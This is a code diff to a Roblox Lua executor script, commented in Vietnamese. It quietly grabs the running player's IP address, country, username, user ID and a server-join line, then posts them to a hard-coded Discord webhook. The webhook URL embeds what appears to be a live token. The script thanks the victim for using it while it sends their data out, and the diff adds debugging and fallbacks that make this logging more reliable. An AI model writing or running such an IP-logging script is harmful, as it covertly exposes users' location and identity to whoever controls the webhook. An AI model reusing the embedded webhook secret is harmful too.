@@ -1,37 +1,73 @@
+-- ===================================================================
+-- Roblox Lua script: gửi thông tin player + country/IP + game name lên Discord webhook
+-- Yêu cầu: executor phải cho phép HttpService:GetAsync ra ngoài (Synapse X, v.v.)
+-- ===================================================================
+
 local Http       = game:GetService("HttpService")
 local WebhookUrl = "https://discord.com/api/webhooks/1379048133702455396/TmMAJJF_g_04qtJasWYKHI2K0JmX-l01wp_LBGGNCj9wECRli2a3OtIXSW-PSyRgmuHy"
 local executor   = identifyexecutor() or "idk"
 
--- Get IP info from https://api.myip.com/
+-- ===================================================================
+-- Hàm lấy thông tin IP & country từ https://api.myip.com/
+-- ===================================================================
 local function getIPInfo()
     local success, response = pcall(function()
         return Http:GetAsync("https://api.myip.com/")
     end)
     if success then
-        local data = Http:JSONDecode(response)
-        if data and data.country and data.ip then
-            return data.country, data.ip
+        -- Debug: in ra JSON trả về
+        print("DEBUG | getIPInfo() response: " .. response)
+        local data = nil
+        -- JSONDecode có thể lỗi nếu response không đúng format
+        local ok, decoded = pcall(function()
+            return Http:JSONDecode(response)
+        end)
+        if ok and type(decoded) == "table" then
+            data = decoded
+        else
+            print("DEBUG | JSONDecode failed or data not table")
+            return "Unknown", "Unknown"
         end
+
+        if data.country and data.ip then
+            print("DEBUG | Country from API: " .. tostring(data.country) .. ", IP: " .. tostring(data.ip))
+            return data.country, data.ip
+        else
+            print("DEBUG | data thiếu trường country hoặc ip")
+        end
+    else
+        print("DEBUG | getIPInfo() failed to fetch from api.myip.com")
     end
+
     return "Unknown", "Unknown"
 end
 
+-- ===================================================================
+-- Hàm build payload để gửi lên Discord
+-- ===================================================================
 local function sendRequest()
     local player      = game.Players.LocalPlayer
     local displayName = player and player.DisplayName or "Display name not available"
     local userName    = player and player.Name or "Unknown"
     local playerId    = player and player.UserId or 0
 
+    -- Tên game, ví dụ: "Zombie Survival" hay tương tự
+    local gameName = tostring(game.Name or "Unknown Game")
+
+    -- Lấy PlaceId + JobId để build teleport script
     local placeId = tostring(game.PlaceId)
     local jobId   = tostring(game.JobId)
     local joinScript = "game:GetService('TeleportService'):TeleportToPlaceInstance(" ..
                         placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"
 
-    -- Get country and IP from API
+    -- Gọi API lấy country & IP
     local country, ip = getIPInfo()
 
-    local gameName = game.Name or "Unknown Game"
+    -- Nếu bạn không muốn in debug nữa thì có thể comment hai dòng print sau
+    print("DEBUG | sendRequest() - Country: " .. country .. " | IP: " .. ip)
+    print("DEBUG | sendRequest() - Game Name: " .. gameName)
 
+    -- Xây dựng payload JSON để gửi qua webhook
     local payload = {
         content = "**Thanks for using the script!**",
         embeds = {
@@ -41,7 +77,7 @@ local function sendRequest()
                 },
                 title = userName .. " | " .. displayName,
                 type  = "rich",
-                color = tonumber(0x00FF00),
+                color = tonumber(0x00FF00),  -- màu xanh lá
                 thumbnail = {
                     url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?" ..
                           "userid=" .. playerId .. "&size=720x720&format=Png&isCircular=false"
@@ -87,9 +123,17 @@ local function sendRequest()
     }
 end
 
-if syn then
+-- ===================================================================
+-- Gửi request lên Discord qua Synapse X hoặc các hàm Http request khác
+-- ===================================================================
+if syn and syn.request then
     syn.request(sendRequest())
 else
-    local requestFunction = http_request or request or HttpPost or syn and syn.request
-    requestFunction(sendRequest())
+    -- Thử các hàm request phổ biến: http_request, request, HttpPost...
+    local requestFunction = http_request or request or HttpPost or (syn and syn.request)
+    if requestFunction then
+        requestFunction(sendRequest())
+    else
+        warn("Không tìm thấy hàm request phù hợp để gửi HTTP request")
+    end
 end
